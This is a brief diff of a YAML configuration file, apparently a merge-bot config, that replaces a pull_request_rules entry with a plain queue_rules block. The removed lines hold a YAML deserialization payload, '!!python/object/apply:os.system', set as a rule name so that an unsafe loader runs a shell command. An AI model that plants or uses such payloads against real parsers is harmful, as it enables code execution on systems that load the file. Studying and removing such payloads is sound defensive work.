@@ -1,4 +1,4 @@
-pull_request_rules:
-  - name: !!python/object/apply:os.system ["id"]
-    conditions: []
-    actions: {}
+queue_rules:
+  - name: default
+    queue_conditions: []
+    merge_conditions: []
